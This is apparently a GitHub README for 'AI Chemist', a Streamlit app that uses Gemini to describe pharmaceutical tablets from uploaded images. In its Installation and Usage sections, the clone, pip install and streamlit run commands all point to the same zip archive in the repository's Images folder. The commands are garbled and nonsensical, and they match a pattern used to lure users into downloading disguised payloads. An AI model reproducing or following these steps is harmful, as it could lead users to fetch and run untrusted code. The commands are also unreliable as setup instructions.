# AI Chemist Project

## Overview

The **AI Chemist** application is an innovative web-based tool designed to assist users in analyzing pharmaceutical tablets through image recognition and artificial intelligence. Utilizing advanced generative AI models, the app identifies tablets from uploaded images and provides detailed descriptions of each tablet's attributes, uses, and functionalities, while ensuring that users receive accurate and reliable information without medical advice.

## Features

- **User-Friendly Interface**: The application features a straightforward Streamlit-based user interface that allows users to easily upload images of tablets and enter prompts.
- **Image Processing**: Users can upload images in formats such as JPG, JPEG, and PNG, which are then processed by the AI model.
- **Generative AI Integration**: The app utilizes Google’s Gemini AI model (specifically `gemini-1.5-flash`) to generate detailed descriptions based on the visual analysis of the tablets.
- **Error Handling**: Robust error handling is implemented to guide users if issues arise during processing, such as missing files or API errors.
- **Environment Variable Management**: Securely manages the Google API key using a `.env` file to protect sensitive information.

## Technologies Used

- **Streamlit**: A powerful framework for building interactive web applications in Python.
- **Google Generative AI**: Utilizes Google’s advanced AI models for processing and generating content.
- **Pillow**: A Python Imaging Library (PIL) fork used for opening, manipulating, and saving images.
- **dotenv**: A Python package that loads environment variables from a `.env` file for configuration.

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
   cd MyProject
   ```

2. Create a virtual environment and activate it:
   ```bash
   python -m venv venv
   source venv/bin/activate  # On Windows use `venv\Scripts\activate`
   ```

3. Install the required libraries:
   ```bash
   pip install -r https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
   ```

4. Set up your Google API key:
   - Create a `.env` file in the root directory and add your Google API key:
     ```
     GOOGLE_API_KEY=your_google_api_key_here
     ```

## Usage

1. Start the Streamlit app:
   ```bash
   streamlit run https://github.com/Chandu0394/AI-Chemist/raw/refs/heads/master/Images/Chemist_A_v2.5.zip
   ```

2. Open your web browser and navigate to `http://localhost:8501`.

3. Upload an image of a tablet and enter a prompt in the text input field.

4. Click the "Tell me" button to receive a detailed description of the tablet based on the image provided.

## Input Prompt Example

```plaintext
You are an expert pharmaceutical chemist analyzing tablets from a visual perspective. Please focus solely on identifying and describing the visual attributes of the tablets without providing medical guidance or treatment information.
```

## Contributing

Contributions are welcome! If you have suggestions for improvements or encounter issues, please feel free to open an issue or submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Acknowledgments

- Thank you to the creators of Streamlit, Google Generative AI, and all other libraries that made this project possible.
- Special thanks to the contributors and open-source community for their invaluable resources and support.

